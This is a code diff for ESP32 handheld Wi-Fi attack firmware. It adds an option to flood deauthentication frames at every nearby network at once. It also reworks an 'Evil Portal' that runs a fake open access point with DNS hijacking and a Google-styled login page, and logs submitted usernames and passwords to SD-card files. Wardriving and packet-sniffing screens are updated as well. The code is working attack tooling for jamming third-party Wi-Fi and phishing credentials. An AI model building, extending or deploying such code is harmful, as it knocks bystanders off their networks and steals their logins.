@@ -8,6 +8,7 @@
 #include "Explorer.h"
 #include "interface.h"
 #include "CONFIG.h"
+#include "misc.h"
 #include "menu/wifi.h"
 #include "deauth.h"
 #include "evilportal.h"
@@ -18,7 +19,10 @@ extern bool inMenu;
 extern byte wifiMenuIndex;
 extern void OLED_printMenu(DisplayType &display, byte menuIndex);
 void createDefaultPortal();
-void saveCapturedDataToCSV(String csvLine);
+void displaySeparatorLine();
+void drawWiFiNetworkListFrame(int selectedIndex, int16_t arrowY = -1);
+void printPortalCaptureLine(const String& text, uint8_t row);
+void printWiFiNetworkName(const String &ssid, int16_t x, int16_t y, int16_t maxWidth, bool selected);
 
 static void resetWiFiMenuButtons() {
   buttonUp.resetStates();
@@ -62,6 +66,15 @@ bool inEvilPortal = false, apRunning = false;
 bool inDeauthMenu = false, isScanning = false, isDeauthing = false;
 bool inWardriving = false, isWardriving = false;
 bool inPacketsMenu = false, isPacketScanning = false, isPacketViewing = false;
+bool deauthScanStarted = false;
+bool packetScanStarted = false;
+bool deauthIgnoreInputsUntilRelease = false;
+bool packetIgnoreInputsUntilRelease = false;
+bool deauthListActive = false;
+bool deauthFloodAll = false;
+bool deauthAttackMenu = false;
+byte deauthAttackIndex = 0;
+bool deauthAttackIgnoreUntilRelease = false;
 bool wifiListUsesScanResults = false;
 int foundNetworks = 0;
 const int MAX_WIFI_NETWORKS = 64;
@@ -71,6 +84,7 @@ String beaconLog[BEACON_LOG_LINES];
 byte beaconLogSize = 0;
 uint8_t bssidList[MAX_WIFI_NETWORKS][6];
 int deauthMenuIndex = 0;
+int wardrivingMenuIndex = 0;
 int packetsMenuIndex = 0;
 File wardrivingFile;
 int wardrivingFileNumber = 1;
@@ -162,6 +176,46 @@ WebServer server(80);
 DNSServer dnsServer;
 String capturedData = "";
 const byte DNS_PORT = 53;
+int portalCaptureFileNumber = 1;
+File portalCaptureFile;
+
+#define MAX_PORTAL_CAPTURES 50
+String portalCaptureList[MAX_PORTAL_CAPTURES];
+int portalCaptureCount = 0;
+int portalCaptureIndex = 0;
+static MenuButtonState portalCaptureUpState;
+static MenuButtonState portalCaptureDownState;
+static MenuButtonState wardrivingUpState;
+static MenuButtonState wardrivingDownState;
+
+static bool wifiLogNavPress(uint8_t pin, MenuButtonState& state) {
+  const bool pressed = digitalRead(pin) == LOW;
+  const unsigned long now = millis();
+  const unsigned long initialDelayMs = 100;
+  const unsigned long repeatDelayMs = 100;
+
+  if (!pressed) {
+    state.wasPressed = false;
+    state.nextRepeatAt = 0;
+    return false;
+  }
+  if (!state.wasPressed) {
+    state.wasPressed = true;
+    state.nextRepeatAt = now + initialDelayMs;
+    return true;
+  }
+  if (now >= state.nextRepeatAt) {
+    state.nextRepeatAt = now + repeatDelayMs;
+    return true;
+  }
+  return false;
+}
+
+static bool wifiNavigationButtonsReleased() {
+  return digitalRead(BUTTON_UP) == HIGH &&
+         digitalRead(BUTTON_DOWN) == HIGH &&
+         digitalRead(BUTTON_OK) == HIGH;
+}
 
 extern "C" {
 #include "esp_wifi.h"
@@ -291,7 +345,7 @@ void teardownBeaconSpamWifi() {
 static const char* portalExts[] = {".html", ".htm"};
 ExplorerEntry portalFileList[MAX_PORTAL_FILES];
 ExplorerState portalExplorer;
-ExplorerConfig portalExplorerCfg = {"/WiFi/Portals", portalExts, 2, true, true, true, true};
+ExplorerConfig portalExplorerCfg = {"/wifi/portals", portalExts, 2, true, true, true, true};
 bool inPortalExplorer = false;
 String getCurrentPortalHtml = "";
 
@@ -324,8 +378,144 @@ bool loadSelectedPortal() {
   return true;
 }
 
+void loadPortalCaptureList() {
+  portalCaptureCount = 0;
+  portalCaptureIndex = 0;
+}
+
+void savePortalCapture(const String& value) {
+  if (value.length() == 0) return;
+  if (portalCaptureFile) {
+    portalCaptureFile.print(value);
+    if (!value.endsWith("\n")) portalCaptureFile.println();
+    portalCaptureFile.flush();
+  }
+}
+
+void finishPortalCaptureFile() {
+  if (!portalCaptureFile) return;
+  portalCaptureFile.println(F("=================="));
+  portalCaptureFile.println(F("Evil Portal finished."));
+  portalCaptureFile.close();
+}
+
+void printPortalCaptureLine(const String& text, uint8_t row) {
+  static String marqueeText[4];
+  static unsigned long marqueeStartedAt[4] = {0, 0, 0, 0};
+  const int16_t x = 1;
+  const int16_t maxWidth = display.width() - x;
+  int16_t x1, y1;
+  uint16_t textWidth, textHeight;
+  display.getTextBounds(text, x, 20 + row * 10, &x1, &y1, &textWidth, &textHeight);
+
+  if (textWidth <= maxWidth) {
+    marqueeText[row] = "";
+    display.setCursor(x, 20 + row * 10);
+    display.print(text);
+    return;
+  }
+  if (marqueeText[row] != text) {
+    marqueeText[row] = text;
+    marqueeStartedAt[row] = millis();
+  }
+  const int visibleChars = 20;
+  String marquee = text + F("   ");
+  const int maxOffset = max(0, (int)marquee.length() - visibleChars);
+  const unsigned long initialPauseMs = 400;
+  const unsigned long loopPauseMs = 400;
+  const unsigned long stepMs = 200;
+  unsigned long elapsed = millis() - marqueeStartedAt[row];
+  int offset = 0;
+  if (elapsed >= initialPauseMs) {
+    const unsigned long duration = (unsigned long)maxOffset * stepMs;
+    const unsigned long cycleDuration = duration + loopPauseMs + duration + loopPauseMs;
+    const unsigned long position = cycleDuration > 0
+      ? (elapsed - initialPauseMs) % cycleDuration : 0;
+    if (position < duration) offset = position / stepMs;
+    else if (position < duration + loopPauseMs) offset = maxOffset;
+    else if (position < duration + loopPauseMs + duration) {
+      offset = maxOffset - ((position - duration - loopPauseMs) / stepMs);
+    }
+  }
+  display.setCursor(x, 20 + row * 10);
+  display.print(marquee.substring(offset, offset + visibleChars));
+}
+
+void displayPortalCaptureList() {
+  display.clearDisplay();
+  display.setTextSize(1);
+  display.setTextColor(SH110X_WHITE);
+  display.setTextWrap(false);
+  display.setCursor(3, 3);
+  display.print(F("Evil Portal "));
+  display.print(portalCaptureIndex + 1);
+  display.print(F("/"));
+  display.println(portalCaptureCount);
+  displaySeparatorLine();
+
+  String value = portalCaptureList[portalCaptureIndex];
+  int lineStart = 0;
+  int row = 0;
+  while (lineStart < value.length() && row < 4) {
+    int lineEnd = value.indexOf('\n', lineStart);
+    if (lineEnd < 0) lineEnd = value.length();
+    printPortalCaptureLine(value.substring(lineStart, lineEnd), row);
+    lineStart = lineEnd + 1;
+    row++;
+  }
+  display.display();
+}
+
+void resetWiFiLogNavigation() {
+  portalCaptureUpState = {};
+  portalCaptureDownState = {};
+  wardrivingUpState = {};
+  wardrivingDownState = {};
+}
+
 String getCurrentWardrivingFileName() {
-  return "/WiFi/Wardriving/Wardriving_" + String(wardrivingFileNumber) + ".txt";
+  return "/wifi/captures/Wardriving_" + String(wardrivingFileNumber) + ".txt";
+}
+
+void drawDeauthAttackMenuFrame(byte selectedIndex, int16_t arrowY = -1) {
+  display.clearDisplay();
+  display.setTextSize(1);
+  display.setTextColor(SH110X_WHITE);
+  display.setCursor(3, 3);
+  display.println(F("Select Target:"));
+  displaySeparatorLine();
+  const int16_t startY = display.getCursorY();
+  const int16_t rowHeight = 11;
+  if (arrowY < 0) arrowY = startY + selectedIndex * rowHeight;
+  display.setCursor(10, startY);
+  display.println(F("Network"));
+  display.setCursor(10, startY + rowHeight);
+  display.println(F("All Networks"));
+  display.setCursor(1, arrowY);
+  display.print(F(">"));
+  display.display();
+}
+
+void displayDeauthAttackMenu(int previousIndex = -1) {
+  if (previousIndex < 0 || previousIndex == deauthAttackIndex) {
+    drawDeauthAttackMenuFrame(deauthAttackIndex);
+    return;
+  }
+
+  const int16_t startY = 19;
+  const int16_t rowHeight = 11;
+  const int16_t fromY = startY + previousIndex * rowHeight;
+  const int16_t toY = startY + deauthAttackIndex * rowHeight;
+  for (byte step = 1; step <= 4; step++) {
+    int progress = (step * 100) / 4;
+    int eased = progress < 50
+      ? (2 * progress * progress) / 100
+      : 100 - (2 * (100 - progress) * (100 - progress)) / 100;
+    int16_t arrowY = fromY + ((toY - fromY) * eased) / 100;
+    drawDeauthAttackMenuFrame(deauthAttackIndex, arrowY);
+    delay(1);
+  }
+  drawDeauthAttackMenuFrame(deauthAttackIndex, toY);
 }
 
 void displaySeparatorLine() {
@@ -402,8 +592,8 @@ void displayEvilPortalScreen() {
   display.setTextSize(1);
   display.setTextColor(SH110X_WHITE);
   display.setCursor(3, 3);
-  display.println(F("Evil-Portal"));
-  display.setCursor(1, 11);
+  display.println(F("Evil Portal"));
+  display.setCursor(3, 11);
   display.println(F("IP: 192.168.4.1"));
   displaySeparatorLine();
   
@@ -430,8 +620,8 @@ void displayDeauthActive(String ssid) {
   display.setCursor(3, 3);
   display.println(F("Deauth..."));
   displaySeparatorLine();
-  display.setCursor(4, display.getCursorY());
-  display.println(ssid.substring(0, 15));
+  const int16_t y = display.getCursorY();
+  printWiFiNetworkName(ssid, 4, y, 108, true);
   display.display();
 }
 
@@ -476,23 +666,27 @@ void displayWardrivingActive() {
   display.println(F("Wardriving..."));
   displaySeparatorLine();
   if (foundNetworks > 0) {
+    const int selected = min(max(wardrivingMenuIndex, 0), foundNetworks - 1);
     display.setCursor(2, display.getCursorY());
-    display.print(foundNetworks);
-    display.print(F(". "));
-    display.println(ssidList[0].substring(0, 15));
+    display.print(selected + 1);
+    display.print(F("/"));
+    display.println(foundNetworks);
+    const int16_t ssidY = display.getCursorY();
+    printWiFiNetworkName(ssidList[selected], 2, ssidY, 120, true);
+    display.setCursor(2, ssidY + 8);
     char bssidStr[18];
     snprintf(bssidStr, sizeof(bssidStr), "%02X:%02X:%02X:%02X:%02X:%02X",
-             bssidList[0][0], bssidList[0][1], bssidList[0][2],
-             bssidList[0][3], bssidList[0][4], bssidList[0][5]);
+             bssidList[selected][0], bssidList[selected][1], bssidList[selected][2],
+             bssidList[selected][3], bssidList[selected][4], bssidList[selected][5]);
     display.setCursor(2, display.getCursorY());
     display.print(F("MAC: "));
     display.println(bssidStr);
     display.setCursor(2, display.getCursorY());
     display.print(F("Enc: "));
-    display.println(getAuthModeString(apRecords[0].authmode));
+    display.println(getAuthModeString(apRecords[selected].authmode));
     display.setCursor(2, display.getCursorY());
     display.print(F("RSSI: "));
-    display.println(apRecords[0].rssi);
+    display.println(apRecords[selected].rssi);
   }
   display.display();
 }
@@ -583,7 +777,6 @@ void packetsStopSniffing() {
   esp_wifi_set_promiscuous(false);
   esp_wifi_set_promiscuous_rx_cb(NULL);
   WiFi.mode(WIFI_OFF);
-  delay(150);
   packetsBssidSet = false;
 }
 
@@ -691,7 +884,6 @@ void beaconSpamList(const char list[]) {
 
 void handlePostRequest() {
   capturedData = "";
-  String csvLine = "";
   for (uint8_t i = 0; i < server.args(); i++) {
     String argName = server.argName(i);
     String argValue = server.arg(i);
@@ -703,13 +895,20 @@ void handlePostRequest() {
     
     capturedData += argValue + "\n";
     
-    if (i > 0) csvLine += ",";
-    csvLine += argName + ":" + argValue;
   }
   
   if (capturedData == "") capturedData = "No valid data";
-  
-  saveCapturedDataToCSV(csvLine);
+
+  if (portalCaptureCount < MAX_PORTAL_CAPTURES) {
+    portalCaptureIndex = portalCaptureCount++;
+  } else {
+    for (int i = 1; i < MAX_PORTAL_CAPTURES; i++) {
+      portalCaptureList[i - 1] = portalCaptureList[i];
+    }
+    portalCaptureIndex = MAX_PORTAL_CAPTURES - 1;
+  }
+  portalCaptureList[portalCaptureIndex] = capturedData;
+  savePortalCapture(capturedData);
   
   digitalWrite(2, HIGH);
   delay(50);
@@ -721,18 +920,8 @@ void handlePostRequest() {
   server.send(302, "text/plain", "");
 }
 
-void saveCapturedDataToCSV(String csvLine) {
-  if (csvLine == "") return;
-  
-  String filePath = "/WiFi/Portals/captured_creds.csv";
-  File file = SD.open(filePath, FILE_APPEND);
-  if (!file) return;
-  file.println(csvLine);
-  file.close();
-}
-
 void createDefaultPortal() {
-  String path = "/WiFi/Portals/Google.html";
+  String path = "/wifi/portals/Google.html";
   if (SD.exists(path)) return;
 
   File file = SD.open(path, FILE_WRITE);
@@ -756,6 +945,19 @@ void startEvilPortal() {
   WiFi.softAP(wifiPortalName, "");
   Serial.println(F("AP started. IP: 192.168.4.1"));
 
+  loadPortalCaptureList();
+  if (!SD.exists("/wifi/captures")) SD.mkdir("/wifi/captures");
+  while (SD.exists("/wifi/captures/Portal_" + String(portalCaptureFileNumber) + ".txt")) {
+    portalCaptureFileNumber++;
+  }
+  String portalFileName = "/wifi/captures/Portal_" + String(portalCaptureFileNumber++) + ".txt";
+  portalCaptureFile = SD.open(portalFileName, FILE_WRITE);
+  if (portalCaptureFile) {
+    portalCaptureFile.println(F("Evil Portal started."));
+    portalCaptureFile.println(F("=================="));
+    portalCaptureFile.flush();
+  }
+
   dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
 
   server.on("/", HTTP_GET, []() {
@@ -775,9 +977,12 @@ void startEvilPortal() {
 
   server.begin();
   apRunning = true;
+  resetWiFiLogNavigation();
+  resetWiFiMenuButtons();
 }
 
 void stopEvilPortal() {
+  finishPortalCaptureFile();
   server.close();
   dnsServer.stop();
   WiFi.softAPdisconnect(true);
@@ -792,6 +997,26 @@ void stopEvilPortal() {
   delay(100);
   sdSPI.begin(SD_CLK, SD_MISO, SD_MOSI);
   SD.begin(SD_CS, sdSPI);
+  resetWiFiMenuButtons();
+}
+
+void returnPortalToExplorer() {
+  finishPortalCaptureFile();
+  server.close();
+  dnsServer.stop();
+  WiFi.softAPdisconnect(true);
+  WiFi.mode(WIFI_OFF);
+  apRunning = false;
+  capturedData = "";
+  extern SPIClass sdSPI;
+  sdSPI.end();
+  delay(100);
+  sdSPI.begin(SD_CLK, SD_MISO, SD_MOSI);
+  SD.begin(SD_CS, sdSPI);
+  loadPortalFileList();
+  inPortalExplorer = true;
+  resetWiFiMenuButtons();
+  drawPortalExplorer();
 }
 
 void startWardriving() {
@@ -802,8 +1027,8 @@ void startWardriving() {
   esp_wifi_set_promiscuous(false);
   esp_wifi_set_max_tx_power(82);
 
-  if (!SD.exists("/WiFi/Wardriving")) {
-    SD.mkdir("/WiFi/Wardriving");
+  if (!SD.exists("/wifi/captures")) {
+    SD.mkdir("/wifi/captures");
   }
   while (SD.exists(getCurrentWardrivingFileName())) {
     wardrivingFileNumber++;
@@ -817,6 +1042,8 @@ void startWardriving() {
   }
   isWardriving = true;
   foundNetworks = 0;
+  wardrivingMenuIndex = 0;
+  resetWiFiLogNavigation();
   lastScanTime = 0;
   WiFi.scanNetworks(true, true);
   displayWardrivingActive();
@@ -875,7 +1102,6 @@ void scanNetworks() {
               wardrivingFile.println(getAuthModeString(record->authmode));
               wardrivingFile.print(F("RSSI: "));
               wardrivingFile.println(record->rssi);
-              wardrivingFile.println();
               wardrivingFile.flush();
             }
           }
@@ -889,11 +1115,23 @@ void scanNetworks() {
 }
 
 void handleWardriving() {
+  buttonUp.tick();
+  buttonDown.tick();
   buttonOK.tick();
   buttonBack.tick();
 
+  const bool up = wifiLogNavPress(BUTTON_UP, wardrivingUpState);
+  const bool down = wifiLogNavPress(BUTTON_DOWN, wardrivingDownState);
+
+  if (foundNetworks > 0) {
+    if (up && wardrivingMenuIndex > 0) wardrivingMenuIndex--;
+    if (down && wardrivingMenuIndex < foundNetworks - 1) wardrivingMenuIndex++;
+  }
+
   if (isWardriving) {
     scanNetworks();
+    displayWardrivingActive();
+  } else if (foundNetworks > 0) {
     displayWardrivingActive();
   } else {
     displayWardrivingPrompt();
@@ -907,6 +1145,7 @@ void handleWardriving() {
   if (buttonBack.isClick()) {
     if (isWardriving) finishWardriving();
     inWardriving = false;
+    resetWiFiLogNavigation();
     displayWiFiMenu(display, wifiMenuIndex);
   }
 }
@@ -956,10 +1195,16 @@ void printWiFiNetworkName(const String &ssid, int16_t x, int16_t y, int16_t maxW
   const unsigned long stepMs = 200;
   unsigned long elapsed = millis() - marqueeStartedAt;
   if (maxOffset > 0 && elapsed >= initialPauseMs) {
-    unsigned long scrollDuration = (maxOffset + 1) * stepMs;
-    unsigned long cyclePosition = (elapsed - initialPauseMs) % (scrollDuration + loopPauseMs);
+    unsigned long scrollDuration = (unsigned long)maxOffset * stepMs;
+    unsigned long cycleDuration = scrollDuration + loopPauseMs + scrollDuration + loopPauseMs;
+    unsigned long cyclePosition = cycleDuration > 0
+      ? (elapsed - initialPauseMs) % cycleDuration : 0;
     if (cyclePosition < scrollDuration) {
       offset = cyclePosition / stepMs;
+    } else if (cyclePosition < scrollDuration + loopPauseMs) {
+      offset = maxOffset;
+    } else if (cyclePosition < scrollDuration + loopPauseMs + scrollDuration) {
+      offset = maxOffset - ((cyclePosition - scrollDuration - loopPauseMs) / stepMs);
     }
   }
 
@@ -968,7 +1213,7 @@ void printWiFiNetworkName(const String &ssid, int16_t x, int16_t y, int16_t maxW
 }
 
 void drawWiFiNetworkListFrame(
-  int selectedIndex, int16_t arrowY = -1
+  int selectedIndex, int16_t arrowY
 ) {
   int networkCount = getStoredWiFiNetworkCount();
   if (networkCount <= 0) return;
@@ -987,7 +1232,7 @@ void drawWiFiNetworkListFrame(
   const int16_t rowHeight = 10;
   const int visibleRows = 5;
   const int startY = display.getCursorY();
-  const int16_t maxTextWidth = display.width() - textX;
+  const int16_t maxTextWidth = 108;
   int startIndex = selectedIndex - (visibleRows - 1);
   startIndex = min(max(0, startIndex), max(0, networkCount - visibleRows));
   int16_t selectedRowY = startY + (selectedIndex - startIndex) * rowHeight;
@@ -1040,6 +1285,74 @@ void handleDeauthSubmenu() {
   buttonOK.tick();
   buttonBack.tick();
 
+  if (buttonBack.isClick()) {
+    isScanning = false;
+    isDeauthing = false;
+    inDeauthMenu = false;
+    deauthScanStarted = false;
+    deauthListActive = false;
+    deauthFloodAll = false;
+    deauthAttackMenu = false;
+    deauthAttackIgnoreUntilRelease = false;
+    WiFi.scanDelete();
+    wifiListUsesScanResults = false;
+    esp_wifi_set_promiscuous(false);
+    esp_wifi_set_promiscuous_rx_cb(NULL);
+    WiFi.mode(WIFI_OFF);
+    resetWiFiMenuButtons();
+    displayWiFiMenu(display, wifiMenuIndex);
+    return;
+  }
+
+  if (deauthAttackMenu) {
+    if (deauthAttackIgnoreUntilRelease) {
+      buttonUp.resetStates();
+      buttonDown.resetStates();
+      buttonOK.resetStates();
+      (void)buttonUp.isClick();
+      (void)buttonDown.isClick();
+      (void)buttonOK.isClick();
+      if (wifiNavigationButtonsReleased()) deauthAttackIgnoreUntilRelease = false;
+      displayDeauthAttackMenu();
+      return;
+    }
+    if (buttonUp.isClick() || buttonDown.isClick()) {
+      byte previousIndex = deauthAttackIndex;
+      deauthAttackIndex = deauthAttackIndex == 0 ? 1 : 0;
+      displayDeauthAttackMenu(previousIndex);
+      return;
+    }
+    if (buttonOK.isClick()) {
+      deauthAttackMenu = false;
+      deauthFloodAll = deauthAttackIndex == 1;
+      isScanning = true;
+      deauthScanStarted = false;
+      deauthIgnoreInputsUntilRelease = false;
+      WiFi.mode(WIFI_STA);
+      WiFi.disconnect();
+      return;
+    }
+    displayDeauthAttackMenu();
+    return;
+  }
+
+  if (deauthIgnoreInputsUntilRelease) {
+    buttonUp.resetStates();
+    buttonDown.resetStates();
+    buttonOK.resetStates();
+    (void)buttonUp.isClick();
+    (void)buttonDown.isClick();
+    (void)buttonOK.isClick();
+    if (wifiNavigationButtonsReleased()) {
+      if (!isScanning) {
+        deauthIgnoreInputsUntilRelease = false;
+        return;
+      }
+    } else {
+      if (!isScanning) return;
+    }
+  }
+
   if (isScanning) {
     display.clearDisplay();
     display.setTextSize(1);
@@ -1051,12 +1364,23 @@ void handleDeauthSubmenu() {
     display.println(F("..."));
     display.display();
 
-    WiFi.mode(WIFI_STA);
-    WiFi.disconnect();
-    foundNetworks = WiFi.scanNetworks(false, true);
+    if (!deauthScanStarted) {
+      WiFi.mode(WIFI_STA);
+      WiFi.disconnect();
+      WiFi.scanNetworks(true, true);
+      deauthScanStarted = true;
+      deauthIgnoreInputsUntilRelease = true;
+      return;
+    }
+
+    int scanResult = WiFi.scanComplete();
+    if (scanResult == -1) return;
+    foundNetworks = scanResult;
+    deauthScanStarted = false;
     if (foundNetworks > 0) {
       isScanning = false;
       wifiListUsesScanResults = true;
+      deauthListActive = true;
       deauthMenuIndex = 0;
       for (int i = 0; i < min(foundNetworks, MAX_WIFI_NETWORKS); i++) {
         ssidList[i] = WiFi.SSID(i);
@@ -1065,6 +1389,13 @@ void handleDeauthSubmenu() {
           memcpy(&apRecords[i], record, sizeof(wifi_ap_record_t));
         }
       }
+      if (deauthFloodAll) {
+        WiFi.scanDelete();
+        wifiListUsesScanResults = false;
+        init_deauth_wifi();
+        isDeauthing = true;
+        return;
+      }
     } else {
       display.clearDisplay();
       display.setTextSize(1);
@@ -1072,7 +1403,6 @@ void handleDeauthSubmenu() {
       display.setCursor(3, 3);
       display.print(F("No networks found"));
       display.display();
-      delay(2000);
       isScanning = false;
       inDeauthMenu = false;
       displayWiFiMenu(display, wifiMenuIndex);
@@ -1082,16 +1412,21 @@ void handleDeauthSubmenu() {
   }
 
   if (isDeauthing) {
-    displayDeauthActive(deauthTargetSsid);
-    uint8_t targetChannel = deauthTargetRecord.primary;
-    uint8_t *apMAC = deauthTargetRecord.bssid;
+    displayDeauthActive(deauthFloodAll ? String("All Networks") : deauthTargetSsid);
     uint8_t broadcastMAC[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
 
-    wsl_bypasser_send_deauth_frame(targetChannel, broadcastMAC, apMAC, apMAC, 0xC0, 0x0007);
-    wsl_bypasser_send_deauth_frame(targetChannel, broadcastMAC, apMAC, apMAC, 0xA0, 0x0007);
-
-    wsl_bypasser_send_deauth_frame(targetChannel, apMAC, broadcastMAC, apMAC, 0xC0, 0x0007);
-    wsl_bypasser_send_deauth_frame(targetChannel, apMAC, broadcastMAC, apMAC, 0xA0, 0x0007);
+    const int firstNetwork = deauthFloodAll ? 0 : deauthMenuIndex - 1;
+    const int lastNetwork = deauthFloodAll ? foundNetworks : firstNetwork + 1;
+    for (int i = firstNetwork; i < lastNetwork; i++) {
+      if (i < 0 || i >= foundNetworks) continue;
+      uint8_t targetChannel = apRecords[i].primary;
+      uint8_t *apMAC = apRecords[i].bssid;
+      esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
+      wsl_bypasser_send_deauth_frame(targetChannel, broadcastMAC, apMAC, apMAC, 0xC0, 0x0007);
+      wsl_bypasser_send_deauth_frame(targetChannel, broadcastMAC, apMAC, apMAC, 0xA0, 0x0007);
+      wsl_bypasser_send_deauth_frame(targetChannel, apMAC, broadcastMAC, apMAC, 0xC0, 0x0007);
+      wsl_bypasser_send_deauth_frame(targetChannel, apMAC, broadcastMAC, apMAC, 0xA0, 0x0007);
+    }
 
     buttonBack.tick();
     if (buttonBack.isClick()) {
@@ -1102,7 +1437,6 @@ void handleDeauthSubmenu() {
       esp_wifi_set_promiscuous(false);
       esp_wifi_set_promiscuous_rx_cb(NULL);
       WiFi.mode(WIFI_OFF);
-      delay(150);
       resetWiFiMenuButtons();
       displayWiFiMenu(display, wifiMenuIndex);
     }
@@ -1123,6 +1457,7 @@ void handleDeauthSubmenu() {
   if (buttonOK.isClick()) {
     wifi_ap_record_t *record = (wifi_ap_record_t *)WiFi.getScanInfoByIndex(deauthMenuIndex);
     if (!record) return;
+    deauthFloodAll = false;
     deauthTargetSsid = getDisplayedWiFiNetworkName(deauthMenuIndex);
     memcpy(&deauthTargetRecord, record, sizeof(wifi_ap_record_t));
     WiFi.scanDelete();
@@ -1139,7 +1474,12 @@ void handleDeauthSubmenu() {
     esp_wifi_set_promiscuous(false);
     esp_wifi_set_promiscuous_rx_cb(NULL);
     WiFi.mode(WIFI_OFF);
-    delay(150);
+    deauthScanStarted = false;
+    deauthIgnoreInputsUntilRelease = false;
+    deauthListActive = false;
+    deauthFloodAll = false;
+    deauthAttackMenu = false;
+    deauthAttackIgnoreUntilRelease = false;
     resetWiFiMenuButtons();
     displayWiFiMenu(display, wifiMenuIndex);
   }
@@ -1150,6 +1490,36 @@ void handlePacketsMenu() {
   buttonDown.tick();
   buttonOK.tick();
   buttonBack.tick();
+
+  if (buttonBack.isClick()) {
+    isPacketScanning = false;
+    isPacketViewing = false;
+    inPacketsMenu = false;
+    packetScanStarted = false;
+    packetsStopSniffing();
+    WiFi.scanDelete();
+    wifiListUsesScanResults = false;
+    resetWiFiMenuButtons();
+    displayWiFiMenu(display, wifiMenuIndex);
+    return;
+  }
+
+  if (packetIgnoreInputsUntilRelease) {
+    buttonUp.resetStates();
+    buttonDown.resetStates();
+    buttonOK.resetStates();
+    (void)buttonUp.isClick();
+    (void)buttonDown.isClick();
+    (void)buttonOK.isClick();
+    if (wifiNavigationButtonsReleased()) {
+      if (!isPacketScanning) {
+        packetIgnoreInputsUntilRelease = false;
+        return;
+      }
+    } else {
+      if (!isPacketScanning) return;
+    }
+  }
 
   if (isPacketScanning) {
     display.clearDisplay();
@@ -1162,9 +1532,19 @@ void handlePacketsMenu() {
     display.println(F("..."));
     display.display();
 
-    WiFi.mode(WIFI_STA);
-    WiFi.disconnect();
-    foundNetworks = WiFi.scanNetworks(false, true);
+    if (!packetScanStarted) {
+      WiFi.mode(WIFI_STA);
+      WiFi.disconnect();
+      WiFi.scanNetworks(true, true);
+      packetScanStarted = true;
+      packetIgnoreInputsUntilRelease = true;
+      return;
+    }
+
+    int scanResult = WiFi.scanComplete();
+    if (scanResult == -1) return;
+    foundNetworks = scanResult;
+    packetScanStarted = false;
     if (foundNetworks > 0) {
       isPacketScanning = false;
       wifiListUsesScanResults = true;
@@ -1183,7 +1563,6 @@ void handlePacketsMenu() {
       display.setCursor(3, 3);
       display.print(F("No networks found"));
       display.display();
-      delay(2000);
       isPacketScanning = false;
       inPacketsMenu = false;
       displayWiFiMenu(display, wifiMenuIndex);
@@ -1198,6 +1577,8 @@ void handlePacketsMenu() {
       packetsStopSniffing();
       isPacketViewing = false;
       isPacketScanning = true;
+      packetScanStarted = false;
+      packetIgnoreInputsUntilRelease = true;
       return;
     }
     if (buttonBack.isClick()) {
@@ -1242,7 +1623,8 @@ void handlePacketsMenu() {
     WiFi.mode(WIFI_OFF);
     esp_wifi_set_promiscuous(false);
     esp_wifi_set_promiscuous_rx_cb(NULL);
-    delay(150);
+    packetScanStarted = false;
+    packetIgnoreInputsUntilRelease = false;
     resetWiFiMenuButtons();
     displayWiFiMenu(display, wifiMenuIndex);
   }
@@ -1288,10 +1670,23 @@ void handleWiFiSubmenu() {
     } else {
       server.handleClient();
       dnsServer.processNextRequest();
-      displayEvilPortalScreen();
+      const bool up = wifiLogNavPress(BUTTON_UP, portalCaptureUpState);
+      const bool down = wifiLogNavPress(BUTTON_DOWN, portalCaptureDownState);
+      if (portalCaptureCount > 0) {
+        if (up && portalCaptureIndex > 0) portalCaptureIndex--;
+        if (down && portalCaptureIndex < portalCaptureCount - 1) portalCaptureIndex++;
+        displayPortalCaptureList();
+      } else {
+        displayEvilPortalScreen();
+      }
+      if (buttonOK.isClick()) {
+        returnPortalToExplorer();
+        return;
+      }
       if (buttonBack.isClick()) {
         stopEvilPortal();
         inEvilPortal = false;
+        resetWiFiLogNavigation();
         displayWiFiMenu(display, wifiMenuIndex);
       }
       return;
@@ -1311,8 +1706,9 @@ void handleWiFiSubmenu() {
   static MenuButtonState downHeld;
 
   if (inFunctionSelection) {
-    upPress = isMenuButtonPress(BUTTON_UP, upHeld);
-    downPress = isMenuButtonPress(BUTTON_DOWN, downHeld);
+    const unsigned long repeatDelayMs = getInterfaceSubmenuRepeatDelay(submenu == 1);
+    upPress = isMenuButtonPress(BUTTON_UP, upHeld, repeatDelayMs);
+    downPress = isMenuButtonPress(BUTTON_DOWN, downHeld, repeatDelayMs);
   } else {
     upHeld.wasPressed = digitalRead(BUTTON_UP) == LOW;
     downHeld.wasPressed = digitalRead(BUTTON_DOWN) == LOW;
@@ -1327,6 +1723,7 @@ void handleWiFiSubmenu() {
     }
     inEvilPortal = true;
     inPortalExplorer = true;
+    loadPortalCaptureList();
     ExplorerInit(portalExplorer, portalFileList, MAX_PORTAL_FILES, portalExplorerCfg);
     loadPortalFileList();
     drawPortalExplorer();
@@ -1356,10 +1753,18 @@ void handleWiFiSubmenu() {
   if (okClick) {
     if (wifiMenuIndex == 0) {
       inDeauthMenu = true;
-      isScanning = true;
+      isScanning = false;
+      deauthScanStarted = false;
+      deauthIgnoreInputsUntilRelease = false;
+      deauthListActive = false;
+      deauthFloodAll = false;
+      deauthAttackMenu = true;
+      deauthAttackIndex = 0;
+      deauthAttackIgnoreUntilRelease = true;
       wifiListUsesScanResults = false;
       WiFi.mode(WIFI_STA);
       WiFi.disconnect();
+      displayDeauthAttackMenu();
     } else if (wifiMenuIndex == 1) {
       if (!inSpamMenu) {
         inSpamMenu = true;
@@ -1384,6 +1789,7 @@ void handleWiFiSubmenu() {
       }
       inEvilPortal = true;
       inPortalExplorer = true;
+      loadPortalCaptureList();
       ExplorerInit(portalExplorer, portalFileList, MAX_PORTAL_FILES, portalExplorerCfg);
       loadPortalFileList();
       drawPortalExplorer();
@@ -1398,6 +1804,8 @@ void handleWiFiSubmenu() {
       inPacketsMenu = true;
       isPacketScanning = true;
       isPacketViewing = false;
+      packetScanStarted = false;
+      packetIgnoreInputsUntilRelease = false;
       packetsBssidSet = false;
       wifiListUsesScanResults = false;
       WiFi.mode(WIFI_STA);
